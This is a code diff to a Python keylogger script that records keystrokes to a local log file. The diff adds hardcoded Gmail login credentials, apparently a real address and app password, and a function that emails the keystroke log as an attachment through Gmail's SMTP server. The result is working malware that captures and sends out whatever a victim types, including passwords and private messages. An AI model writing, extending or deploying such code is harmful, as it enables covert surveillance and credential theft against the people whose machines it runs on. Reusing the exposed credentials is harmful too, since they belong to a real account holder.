@@ -33,8 +33,14 @@ import os
 import getpass
 from requests import get
 
-# creating keylogger
 key_info = "key_log.txt"
+
+email_addr = "divkirnapure7@gmail.com"
+password = "uqrlxmkvoncsccru"
+
+toaddr = "divkirnapure7@gmail.com"
+
+# creating keylogger
 
 file_path = "C:\\me\\python"
 extend = "\\"
@@ -76,4 +82,56 @@ def on_release(key):
     
 with Listener(on_press= on_press, on_release= on_release) as listner:
     listner.join()
+
+# adding email functionality
+
+def send_email(filename, attachment_path, toaddr):
+    fromaddr = email_addr
+
+    msg = MIMEMultipart()
+    msg["From"] = fromaddr
+    msg["To"] = toaddr
+    msg["Subject"] = "Log File"
+
+    body = "Please find the attached log file."
+    msg.attach(MIMEText(body, "plain"))
+
+    # Attachment
+    if not os.path.exists(attachment_path):
+        print("Attachment not found!")
+        return
+
+    with open(attachment_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+
+    part.add_header(
+        "Content-Disposition",
+        f'attachment; filename="{filename}"'
+    )
+
+    msg.attach(part)
+
+    # SMTP
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(fromaddr, password)  # APP PASSWORD ONLY
+        server.sendmail(fromaddr, toaddr, msg.as_string())
+        server.quit()
+        print("Email sent successfully")
+
+    except smtplib.SMTPAuthenticationError:
+        print("Authentication failed. Check App Password.")
+    except Exception as e:
+        print("Error sending email:", e)
+
+send_email(
+    filename=key_info,
+    attachment_path=file_path + extend + key_info,
+    toaddr=toaddr
+)
+
 
